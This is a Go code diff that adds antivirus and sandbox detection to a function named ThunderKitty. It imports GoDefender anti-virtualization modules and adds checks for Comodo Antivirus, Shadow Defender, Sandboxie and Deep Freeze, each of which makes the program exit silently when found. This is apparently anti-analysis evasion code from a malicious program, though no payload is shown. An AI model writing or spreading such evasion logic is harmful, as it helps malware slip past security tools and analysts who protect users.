@@ -23,6 +23,10 @@ import (
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMArtifacts"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RepetitiveProcess"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ParallelsCheck"
+    "github.com/EvilBytecode/GoDefender/AntiVirtualization/ComodoDetection"
+    "github.com/EvilBytecode/GoDefender/AntiVirtualization/ShadowDefenderDetection"
+    "github.com/EvilBytecode/GoDefender/AntiVirtualization/SandboxieDetection"
+    "github.com/EvilBytecode/GoDefender/AntiVirtualization/DeepFreezeDetection"
 )
 
 func ThunderKitty() {
@@ -82,6 +86,31 @@ func ThunderKitty() {
 		log.Println("[DEBUG] Parallels detected. Exiting")
 		os.Exit(-1)
 	}
+
+
+    // Comodo Antivirus detection
+    if comodoDetected := ComodoDetection.DetectComodoAntivirus(); comodoDetected {
+        log.Println("[DEBUG] Comodo Antivirus detected")
+        os.Exit(-1)
+    }
+
+    // Shadow Defender detection
+    if shadowDefenderDetected := ShadowDefenderDetection.DetectShadowDefender(); shadowDefenderDetected {
+        log.Println("[DEBUG] Shadow Defender detected")
+        os.Exit(-1)
+    }
+
+    // Sandboxie detection
+    if sandboxieDetected := SandboxieDetection.DetectSandboxie(); sandboxieDetected {
+        log.Println("[DEBUG] Sandboxie detected")
+        os.Exit(-1)
+    }
+
+    // Deep Freeze detection
+    if deepFreezeDetected := DeepFreezeDetection.DetectDeepFreeze(); deepFreezeDetected {
+        log.Println("[DEBUG] Deep Freeze detected")
+        os.Exit(-1)
+    }
 
 	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()
 
